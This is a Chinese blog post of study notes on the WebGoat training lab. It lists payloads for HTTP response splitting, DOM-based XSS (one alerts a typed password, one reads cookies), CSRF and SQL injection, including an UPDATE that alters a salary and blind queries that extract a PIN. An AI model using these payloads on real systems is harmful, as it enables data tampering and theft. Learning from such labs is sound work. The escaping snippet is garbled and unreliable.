---
layout: post
title:  "WebGoat笔记"
date:   2014-03-03 16:23:37 +0800
categories: 笔记
tags:   [web]
---
1. http splitting
    对于302请求执行splitting，更改Last-Modified属性到未来时间来更改cookie
    
        foobar
        Content-Length: 0

        HTTP/1.1 200 OK
        Content-Type: text/html
        Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
        Content-Length: 47

        Hacked J

2. 基于dom的XSS
    * 使用img
    
            <img src=x onerror=;;alert('xss') />
    
    * 使用iframe
    
            <IFRAME src="javascript:alert('xss');"></IFRAME>
     
    * 其他标签
            
            please enter your password:<BR><input type="password" name="pass"/>
            <button onClick="javascript:alert('i have your password: '+pass.value);"></button>

    * scape来防止基于dom的XSS
    
            function escapeHTML (str) { 
            var div = document_createElement_x_x_x_x_x('div');
            var text = document_createTextNode(str);
                            div.a(text); 
                            return div.innerHTML; 
                     }

3. AJAX响应中的DOM注入
     一般在处理AJAX响应的时候会使用eval（），这样在响应中注入需要的JavaScript代码(如：`document.form.SUBMIT.disabled = false;`)

4. AJAX响应中的XML/json注入
     修改AJAX响应中的xml/json数据

5. 使用eval的危险
    如果AJAX响应中有执行eval_r()代码会很危险，通过注入来执行自己的代码，例如：
     `123');alert(document.cookie);('`

6. java检验输入的字符串防止存储的xss

        String regex = "[\\s\\w-,]*";
        String stringToValidate = firstName+lastName+ssn+title+phone+address1+address2+
        startDate+ccn+disciplinaryActionDate+
        disciplinaryActionNotes+personalDescription;
        Pattern pattern = Pattern.compile(regex);
        validate(stringToValidate, pattern);
     
7. java对输出的字符串encode防止存储的xss
   使用这里的encode方法

8. 需要确认的CSRF
    通过iframe
    ![iframe](/images/webgoat1.png)
    
    通过img
    ![iframe](/images/webgoat2.png)

9. 带有标识码的CSRF。在访问一个页面后生成的标识码，要作为参数在伪装的请求中提交
    提交一个请求，获取响应中的CSRFToken参数的值，在最终的请求中提交
    ![iframe](/images/webgoat3.png)

10. 注入
    * 命令注入  （使用;分隔多个命令）
    * xpath注入  http://www.w3school.com.cn/xpath/
    * SQL注入。使用or和and；--注释；
      例子：       
                
                smith' OR '1' = '1
                101 OR 1=1
                whatever'; UPDATE salaries SET salary=999999 WHERE userid='jsmith
                数字盲打：101 AND ((SELECT pin FROM pins WHERE cc_number='1111222233334444') > 10000 );
                猜字：101 AND (SELECT  ASCII(SUBSTR(name,1,1))  FROM pins WHERE cc_number=1111222233334444)=74  （转成charcode是为了使用一些工具（jhijack）进行一定范围内（'A' = 65 'Z' = 90 'a' = 97 'z' = 122）的批量测试）

11. [fuzzdb](https://code.google.com/p/fuzzdb/){:target="_blank"}

12. 会话完成攻击（[Session fixation](http://en.wikipedia.org/wiki/Session_fixation){:target="_blank"}）



这个哥们写得挺有意思。。。。                      
[http://blog.sina.com.cn/s/articlelist_1829596415_0_2.html](http://blog.sina.com.cn/s/articlelist_1829596415_0_2.html){:target="_blank"}）